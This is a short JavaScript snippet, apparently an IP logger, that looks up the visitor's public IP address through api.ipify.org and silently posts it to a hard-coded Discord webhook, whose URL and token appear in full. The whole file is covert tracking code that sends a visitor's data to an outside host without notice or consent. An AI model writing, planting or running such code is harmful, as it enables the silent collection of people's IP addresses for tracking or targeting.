var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
  return response.json();
})
.then(function(data) {
  ip = data.ip;
  var webhook = 'https://discord.com/api/webhooks/1129328426503905351/rX4l5Sv1Y0UAYbrmzFj6G2jyRroHyOnhXfeyS-0knV9eabFntCPfjqZ4hnAzXxVp6FQD'
  var message = {
    content: 'IP:' + ip
  };

      fetch(webhook, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
      });
});
